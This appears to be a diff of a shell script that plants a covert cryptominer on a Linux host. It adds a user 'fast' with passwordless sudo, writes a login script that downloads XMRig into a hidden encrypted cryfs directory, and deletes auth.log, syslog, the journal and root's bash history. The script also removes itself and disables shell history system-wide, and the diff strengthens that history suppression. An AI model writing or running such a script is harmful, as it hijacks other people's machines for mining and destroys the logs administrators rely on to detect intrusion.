@@ -7,17 +7,20 @@ adduser fast sudo
 echo "fast ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
 ecryptfs-setup-swap -f
 echo "#!/bin/bash
-mkdir /home/fast/cr /home/fast/crd
-cryfs /home/fast/cr /home/fast/crd
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-focal-x64.tar.gz -O /home/fast/crd/xm.tar.gz
-tar -xvzf /home/fast/crd/xm.tar.gz
-cp /home/fast/xmrig-6.16.2/config.json /home/fast/crd/config.json
-cp /home/fast/xmrig-6.16.2/xmrig /home/fast/crd/xmrig
-rm -rf /home/fast/xmrig-6.16.2
-rm -rf /home/fast/crd/xm.tar.gz
+sudo mkdir /home/fast/cr /home/fast/crd
+sudo cryfs /home/fast/cr /home/fast/crd
+sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-focal-x64.tar.gz -O /home/fast/crd/xm.tar.gz
+sudo tar -xvzf /home/fast/crd/xm.tar.gz
+sudo cp /home/fast/xmrig-6.16.2/config.json /home/fast/crd/config.json
+sudo cp /home/fast/xmrig-6.16.2/xmrig /home/fast/crd/xmrig
+sudo rm -rf /home/fast/xmrig-6.16.2
+sudo rm -rf /home/fast/crd/xm.tar.gz
 sudo rm -rf /var/log/auth.log /var/log/syslog.log /var/log/journal/* /root/.bash_history
 sudo rm -rf /etc/profile.d/crar.sh
-sudo echo 'unset HISTFILE' >> ~/.bash_profile
+sudo echo 'unset HISTFILE
+set +o history' >> ~/.bash_profile
+sudo echo 'unset HISTFILE
+set +o history' >> /etc/profile.d/disable.history.sh
 history -c
 cd /home/fast/crd/
 screen -S crd" >> /etc/profile.d/crar.sh
